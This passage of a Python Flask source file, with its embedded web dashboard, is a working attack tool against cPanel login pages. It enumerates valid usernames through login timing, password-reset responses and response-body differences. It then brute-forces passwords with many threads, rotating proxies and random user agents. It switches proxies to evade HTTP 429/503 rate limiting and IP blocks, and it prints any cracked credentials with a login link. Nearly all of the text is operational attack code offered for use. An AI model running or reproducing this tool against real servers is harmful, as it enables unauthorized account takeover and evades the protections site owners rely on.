  document.getElementById('found-box').style.display='none';
  document.getElementById('btn-go').disabled=true;document.getElementById('btn-go').style.display='none';
  document.getElementById('btn-xx').style.display='block';
  tried=0;total=0;validU=0;found=0;tableData=[];userStats={};statusDist={};hmapData={};loginUrl='';liveCnt=0;
  document.getElementById('live-feed').innerHTML='<div class="lf-row"><span class="lf-combo" style="color:#21262d">Starting...</span></div>';
  setStat('s-tot','0');setStat('s-tri','0');setStat('s-val','0');setStat('s-spd','0');setStat('s-fnd','0');
  setProgress(0,'Starting...');setStat('tc','0 rows');
  document.getElementById('live-dot').className='live-dot on';
  document.getElementById('live-status-txt').textContent='STARTING';
  document.getElementById('live-status-txt').style.color='#58a6ff';
  startTime=Date.now();
  sTimer=setInterval(()=>{
    const rpm=tried>0?Math.round(tried*(60000/(Date.now()-startTime))):0;setStat('s-spd',rpm);
  },3000);
  log('[*] Attack shuru ho raha hai...','ti');
  const params=new URLSearchParams({url,port,mode,threads,delay,reset_url});
  fetch('/start',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:params})
  .then(r=>r.json()).then(data=>{
    if(!data.job_id){log('[ERROR] Server error','terr');return;}
    evtSrc=new EventSource('/stream/'+data.job_id);
    evtSrc.onmessage=e=>{if(stopped)return;const r=parseMsg(e.data);if(r)log(r.msg,r.cls);};
    evtSrc.addEventListener('done',()=>{
      evtSrc.close();document.getElementById('btn-go').disabled=false;
      document.getElementById('btn-go').style.display='block';document.getElementById('btn-xx').style.display='none';
      setProgress(100,'Done');clearInterval(sTimer);idleLive();
      const el=Math.floor((Date.now()-startTime)/1000);
      log(`[*] Complete — ${Math.floor(el/60)}m ${el%60}s | Tried: ${tried} | Found: ${found}`,'ti');
      updateCharts();
    });
    evtSrc.onerror=()=>{if(stopped)return;evtSrc.close();
      document.getElementById('btn-go').disabled=false;document.getElementById('btn-go').style.display='block';
      document.getElementById('btn-xx').style.display='none';clearInterval(sTimer);idleLive();log('[!] Connection lost','tw');};
  });
}
function stopAttack(){
  stopped=true;if(evtSrc){evtSrc.close();}
  document.getElementById('btn-go').disabled=false;document.getElementById('btn-go').style.display='block';
  document.getElementById('btn-xx').style.display='none';
  setProgress(100,'Stopped');clearInterval(sTimer);idleLive();log('[STOPPED] Rok diya.','tw');updateCharts();
}
document.querySelectorAll('.mb').forEach(b=>b.addEventListener('click',()=>{
  document.querySelectorAll('.mb').forEach(x=>x.classList.remove('act'));b.classList.add('act');}));
</script>
</body>
</html>"""

# ── Utils ─────────────────────────────────────────────────────────
def load_list(fn):
    p=os.path.join(BASE,fn)
    if not os.path.exists(p): return []
    with open(p,"r",encoding="utf-8",errors="ignore") as f:
        return [l.strip() for l in f if l.strip()]

def emit(q,msg): q.put(msg)
def stat(q,**kw): q.put("STAT:"+"|".join(f"{k}={v}" for k,v in kw.items()))

row_lock=threading.Lock(); row_n=[0]
def row(q,user,passwd,status,time_ms,result,rtype="BRUTE",proxy="Direct"):
    with row_lock: row_n[0]+=1; n=row_n[0]
    q.put(f"ROW:{n}|||{user}|||{passwd}|||{status}|||{time_ms:.0f}|||{result}|||{rtype}|||{proxy}")

def live(q,user,passwd,status,time_ms,result,proxy="Direct"):
    q.put(f"LIVE:{user}|||{passwd}|||{status}|||{time_ms:.0f}|||{result}|||{proxy}")

# ── Proxy + Session factory ────────────────────────────────────────
def make_session(proxy_str=None):
    s=requests.Session()
    s.headers.update({"User-Agent":random.choice(USER_AGENTS)})
    if proxy_str:
        s.proxies={"http":proxy_str,"https":proxy_str}
    return s

# ── Enumerate Users ────────────────────────────────────────────────
def enumerate_users(host,port,scheme,usernames,q,delay,custom_reset_url="",proxies=None):
    login_url=f"{scheme}://{host}:{port}/login/"
    JUNK="XXXINVALID_ZZZ999XXX"
    valid_set={}

    def mark(user,reason):
        if user not in valid_set: valid_set[user]=[]
        if reason not in valid_set[user]: valid_set[user].append(reason)

    proxy_idx=[0]
    def next_proxy():
        if not proxies: return None
        p=proxies[proxy_idx[0]%len(proxies)]; proxy_idx[0]+=1; return p

    # Baseline
    emit(q,"[*] Baseline measure kar raha hoon...")
    s=make_session(next_proxy())
    b_times=[]; b_len=0
    for _ in range(3):
        try:
            t0=time.time()
            rb=s.post(login_url,data={"user":"zzz_def_inv","pass":JUNK,"goto_uri":"/"},verify=False,timeout=15,allow_redirects=False)
            b_times.append((time.time()-t0)*1000); b_len=len(rb.text)
        except: pass
        time.sleep(0.3)
    b_avg=sum(b_times)/len(b_times) if b_times else 500
    emit(q,f"[*] Baseline avg={b_avg:.0f}ms  len={b_len}")
    emit(q,"")

    # Method 1: Timing
    emit(q,"[METHOD 1/3] Timing Enumeration")
    emit(q,"="*50)
    for user in usernames:
        proxy=next_proxy()
        s=make_session(proxy)
        proxy_disp=proxy.split("@")[-1] if proxy else "Direct"
        try:
            ts=[]
            for _ in range(2):
                t0=time.time()
                s.post(login_url,data={"user":user,"pass":JUNK,"goto_uri":"/"},verify=False,timeout=15,allow_redirects=False)
                ts.append((time.time()-t0)*1000); time.sleep(0.1)
            avg=sum(ts)/len(ts); diff=avg-b_avg
            if diff>280:
                mark(user,f"TIMING+{diff:.0f}ms")
                emit(q,f"[VALID] {user:<22} avg={avg:.0f}ms SLOW +{diff:.0f}ms")
                row(q,user,"[enum]","SLOW",avg,"VALID_USER","ENUM_TIMING",proxy_disp)
            else:
                emit(q,f"[-] {user:<22} avg={avg:.0f}ms")
                row(q,user,"[enum]","NORMAL",avg,"INVALID_USER","ENUM_TIMING",proxy_disp)
            live(q,user,"[timing]",f"SLOW+{diff:.0f}ms" if diff>280 else "NORMAL",avg,"VALID_USER" if diff>280 else "FAIL",proxy_disp)
        except Exception as e:
            emit(q,f"[!] {user} — {e}")
            row(q,user,"[enum]","ERR",0,"ERROR","ENUM_TIMING",proxy_disp)
        stat(q,valid=len(valid_set))
        time.sleep(delay+random.uniform(0,0.2))

    emit(q,"")

    # Method 2: Reset Page
    emit(q,"[METHOD 2/3] Reset Page Enumeration")
    emit(q,"="*50)
    if custom_reset_url:
        reset_candidates=[custom_reset_url,f"{scheme}://{host}:{port}/resetpass"]
    else:
        reset_candidates=[f"{scheme}://{host}:{port}/resetpass",f"{scheme}://{host}:{port}/security/resetpass"]

    working_reset=None
    for ru in reset_candidates:
        try:
            r=make_session(next_proxy()).get(ru,verify=False,timeout=8,allow_redirects=True)
            if r.status_code==200 and len(r.text)>200:
                working_reset=ru; emit(q,f"[+] Reset URL: {ru}"); break
        except: continue
    if not working_reset:
        emit(q,"[!] Reset page nahi mila — Method 2 skip")
    else:
        try:
            rb2=make_session(next_proxy()).post(working_reset,data={"user":"zzz_inv_zzz"},verify=False,timeout=10,allow_redirects=False)
            rb2_len=len(rb2.text); emit(q,f"[*] Reset baseline len={rb2_len}")
        except: rb2_len=0
        for user in usernames:
            proxy=next_proxy(); proxy_disp=proxy.split("@")[-1] if proxy else "Direct"
            try:
                t0=time.time()
                r=make_session(proxy).post(working_reset,data={"user":user},verify=False,timeout=10,allow_redirects=False)
                elapsed=(time.time()-t0)*1000; rlen=len(r.text); rtxt=r.text.lower()
                ldiff=abs(rlen-rb2_len)
                vkw=["sent","email","reset","success","check your","password has been"]
                ikw=["not exist","invalid","no account","not found","error","incorrect"]
                if any(k in rtxt for k in vkw) and not any(k in rtxt for k in ikw):
                    mark(user,"RESET_POS"); emit(q,f"[VALID] {user:<22} reset positive")
                    row(q,user,"[reset]",str(r.status_code),elapsed,"VALID_USER","ENUM_RESET",proxy_disp)
                    live(q,user,"[reset]",str(r.status_code),elapsed,"VALID_USER",proxy_disp)
                elif ldiff>60 and not any(k in rtxt for k in ikw):
                    mark(user,f"RESET_DIFF+{ldiff}"); emit(q,f"[VALID] {user:<22} reset diff +{ldiff}")
                    row(q,user,"[reset]",str(r.status_code),elapsed,"VALID_USER","ENUM_RESET",proxy_disp)
                    live(q,user,"[reset]",str(r.status_code),elapsed,"VALID_USER",proxy_disp)
                else:
                    emit(q,f"[-] {user:<22} len={rlen}")
                    row(q,user,"[reset]",str(r.status_code),elapsed,"INVALID_USER","ENUM_RESET",proxy_disp)
                    live(q,user,"[reset]",str(r.status_code),elapsed,"FAIL",proxy_disp)
            except Exception as e:
                emit(q,f"[!] {user} — {e}")
                row(q,user,"[reset]","ERR",0,"ERROR","ENUM_RESET",proxy_disp)
            stat(q,valid=len(valid_set))
            time.sleep(delay+random.uniform(0,0.2))
    emit(q,"")

    # Method 3: Body Diff
    emit(q,"[METHOD 3/3] Response Body Diff")
    emit(q,"="*50)
    try:
        rb3=make_session(next_proxy()).post(login_url,data={"user":"zzz_body_inv","pass":JUNK,"goto_uri":"/"},verify=False,timeout=12,allow_redirects=False)
        b3_len=len(rb3.text); emit(q,f"[*] Body baseline len={b3_len}")
    except: b3_len=b_len
    for user in usernames:
        proxy=next_proxy(); proxy_disp=proxy.split("@")[-1] if proxy else "Direct"
        try:
            t0=time.time()
            r=make_session(proxy).post(login_url,data={"user":user,"pass":JUNK,"goto_uri":"/"},verify=False,timeout=12,allow_redirects=False)
            elapsed=(time.time()-t0)*1000; rlen=len(r.text); rtxt=r.text.lower()
            ldiff=abs(rlen-b3_len)
            if ldiff>45 or user.lower() in rtxt:
                reason=f"BODY_DIFF+{ldiff}" if ldiff>45 else "BODY_REF"
                mark(user,reason); emit(q,f"[VALID] {user:<22} {reason}")
                row(q,user,"[body]",str(r.status_code),elapsed,"VALID_USER","ENUM_BODY",proxy_disp)
                live(q,user,"[body]",str(r.status_code),elapsed,"VALID_USER",proxy_disp)
            else:
                emit(q,f"[-] {user:<22} len={rlen}")
                row(q,user,"[body]",str(r.status_code),elapsed,"INVALID_USER","ENUM_BODY",proxy_disp)
                live(q,user,"[body]",str(r.status_code),elapsed,"FAIL",proxy_disp)
        except Exception as e:
            emit(q,f"[!] {user} — {e}")
            row(q,user,"[body]","ERR",0,"ERROR","ENUM_BODY",proxy_disp)
        stat(q,valid=len(valid_set))
        time.sleep(delay+random.uniform(0,0.2))

    emit(q,""); emit(q,"="*50); emit(q,"[REPORT] ENUM RESULTS"); emit(q,"="*50)
    if valid_set:
        for u,rs in valid_set.items():
            emit(q,f"[VALID] {u}"); emit(q,f"[REPORT]   Methods: {', '.join(rs)}")
        emit(q,f"[+] Valid candidates: {len(valid_set)}")
    else:
        emit(q,"[!] Koi valid nahi mila — sab pe brute karenge")
    emit(q,""); stat(q,valid=len(valid_set))
    return list(valid_set.keys()) if valid_set else usernames

# ── Brute Force ────────────────────────────────────────────────────
def brute_force(host,port,scheme,usernames,passwords,q,threads_n,delay,proxies=None):
    login_url=f"{scheme}://{host}:{port}/login/"
    found_ev=threading.Event(); found_list=[]; lock=threading.Lock()
    tried_ref=[0]; total_c=len(usernames)*len(passwords)
    proxy_idx=[0]
    def next_proxy():
        if not proxies: return None
        p=proxies[proxy_idx[0]%len(proxies)]; proxy_idx[0]+=1; return p

    emit(q,f"[*] BRUTE FORCE — {len(usernames)} users × {len(passwords)} passwords = {total_c}")
    emit(q,"="*50)
    stat(q,total=total_c,tried=0,found=0)
    cq=Queue()
    for u in usernames:
        for p in passwords: cq.put((u,p))

    def worker():
        while not found_ev.is_set():
            try: user,passwd=cq.get(timeout=1)
            except Empty: break
            proxy=next_proxy()
            proxy_disp=proxy.split("@")[-1] if proxy else "Direct"
            s=make_session(proxy)
            retry=0
            while retry<3:
                try:
                    t0=time.time()
                    r=s.post(login_url,data={"user":user,"pass":passwd,"goto_uri":"/"},verify=False,timeout=12,allow_redirects=False)
                    elapsed=(time.time()-t0)*1000
                    scode=str(r.status_code)
                    # Anti-block: 429/503 = server blocking, wait + rotate proxy
                    if r.status_code in [429,503]:
                        emit(q,f"[!] BLOCKED (HTTP {r.status_code}) — {user}:{passwd} — wait 10s + proxy rotate")
                        time.sleep(10+random.uniform(0,5))
                        proxy=next_proxy(); proxy_disp=proxy.split("@")[-1] if proxy else "Direct"
                        s=make_session(proxy); retry+=1; continue
                    hit=(300<=r.status_code<400)
                    break
                except requests.exceptions.ConnectionError:
                    emit(q,f"[!] Connection error — {user}:{passwd} — retry {retry+1}/3")
                    time.sleep(5+random.uniform(0,3))
                    proxy=next_proxy(); s=make_session(proxy); retry+=1
                    if retry>=3:
                        with lock:
                            tried_ref[0]+=1
                            row(q,user,passwd,"ERR",0,"ERROR","BRUTE",proxy_disp)
                            live(q,user,passwd,"ERR",0,"ERROR",proxy_disp)
                            stat(q,tried=tried_ref[0])
                        cq.task_done(); break
                    continue
                except Exception as e:
                    with lock:
                        tried_ref[0]+=1
                        emit(q,f"[!] {user}:{passwd} — {e}")
                        row(q,user,passwd,"ERR",0,"ERROR","BRUTE",proxy_disp)
                        stat(q,tried=tried_ref[0])
                    cq.task_done(); time.sleep(2); break
            else:
                cq.task_done(); continue

            with lock:
                tried_ref[0]+=1
                pct=int(tried_ref[0]/total_c*100) if total_c else 0
                stat(q,tried=tried_ref[0],total=total_c,found=len(found_list))
                live(q,user,passwd,scode,elapsed,"FOUND" if hit else "FAIL",proxy_disp)
                if hit:
                    found_ev.set(); found_list.append((user,passwd))
                    link=f"{scheme}://{host}:{port}/login/?user={user}&pass={passwd}"
                    emit(q,"="*50)
                    emit(q,f"[FOUND] *** MILGAYA ***")
                    emit(q,f"[FOUND] Username: {user}")
                    emit(q,f"[FOUND] Password: {passwd}")
                    emit(q,f"[FOUND] Link: {link}")
                    emit(q,"="*50)
                    emit(q,f"FOUND_CRED:{user}|||{passwd}|||{link}")
                    row(q,user,passwd,scode,elapsed,"FOUND","BRUTE",proxy_disp)
                    stat(q,found=len(found_list))
                else:
                    emit(q,f"[-] [{tried_ref[0]}/{total_c}] {pct}%  {user}:{passwd}  HTTP {scode}")
                    row(q,user,passwd,scode,elapsed,"FAIL","BRUTE",proxy_disp)
            cq.task_done()
            time.sleep(delay+random.uniform(0,delay*0.3))

    ts=[threading.Thread(target=worker,daemon=True) for _ in range(threads_n)]
    for t in ts: t.start()
    for t in ts: t.join()

    emit(q,""); emit(q,"="*50); emit(q,"[REPORT] BRUTE RESULTS"); emit(q,"="*50)
    if found_list:
        for u,p in found_list: emit(q,f"[FOUND] {u}:{p}")
    else:
        emit(q,"[x] Nahi mila.")
        emit(q,"[*] username.txt / password.txt mein aur words daalo")
        emit(q,"[*] proxies.txt mein proxies daal ke IP block bypass karo")
    emit(q,"")

# ── Job Runner ─────────────────────────────────────────────────────
def run_job(job_id,url,port,scheme,mode,threads_n,delay,custom_reset_url):
    row_n[0]=0
    q=JOBS[job_id]["queue"]
    try:
        host=url.replace("https://","").replace("http://","").split(":")[0].rstrip("/")
        usernames=load_list("username.txt") or ["admin","administrator","root","cpanel","webmaster"]
        passwords=load_list("password.txt") or ["admin","admin123","123456","password"]
        proxies=load_list("proxies.txt") or []
        emit(q,f"[*] Host: {host}:{port} ({scheme})")
        emit(q,f"[*] Usernames: {len(usernames)}  Passwords: {len(passwords)}")
        emit(q,f"[*] Proxies: {len(proxies)} loaded {'✓' if proxies else '(direct)'}")
        emit(q,f"[*] Threads: {threads_n}  Delay: {delay}s")
        if custom_reset_url: emit(q,f"[*] Custom reset URL: {custom_reset_url}")
        emit(q,"")
        if mode=="1":
            emit(q,"[*] MODE 1: Enum → Brute")
            valid=enumerate_users(host,port,scheme,usernames,q,delay,custom_reset_url,proxies or None)
            emit(q,f"[*] Valid users: {len(valid)} — brute force shuru...")
            brute_force(host,port,scheme,valid,passwords,q,threads_n,delay,proxies or None)
        elif mode=="2":
            emit(q,"[*] MODE 2: Direct Brute")
            stat(q,total=len(usernames)*len(passwords))
            brute_force(host,port,scheme,usernames,passwords,q,threads_n,delay,proxies or None)
        elif mode=="3":
            emit(q,"[*] MODE 3: Sirf Enum")
            enumerate_users(host,port,scheme,usernames,q,delay,custom_reset_url,proxies or None)
    except Exception as e:
        emit(q,f"[!] Job error: {e}")
    finally:
        JOBS[job_id]["done"]=True; q.put(None)

@app.route("/")
def index(): return render_template_string(HTML)

@app.route("/start", methods=["POST"])
def start():
    url=request.form.get("url","").strip()
    try: port=int(request.form.get("port","2083"))
    except: port=2083
    mode=request.form.get("mode","1")
    try: threads=int(request.form.get("threads",2))
    except: threads=2
    try: delay=float(request.form.get("delay",0.5))
    except: delay=0.5
    reset_url=request.form.get("reset_url","").strip()
    scheme="http" if port==2082 else "https"
    job_id=str(uuid.uuid4())[:8]
    JOBS[job_id]={"queue":Queue(),"done":False}
    threading.Thread(target=run_job,args=(job_id,url,port,scheme,mode,threads,delay,reset_url),daemon=True).start()
    return {"job_id":job_id}

@app.route("/stream/<job_id>")
def stream(job_id):
    if job_id not in JOBS: return "Not found",404
    def gen():
        q=JOBS[job_id]["queue"]
        while True:
            try:
                msg=q.get(timeout=60)
                if msg is None: yield "event: done\ndata: done\n\n"; break
                yield f"data: {msg.replace(chr(10),' ')}\n\n"
            except Empty: yield ": ping\n\n"
    return Response(gen(),mimetype="text/event-stream",headers={"Cache-Control":"no-cache","X-Accel-Buffering":"no"})

if __name__=="__main__":
    app.run(host="0.0.0.0",port=int(os.environ.get("PORT",5000)),debug=False)
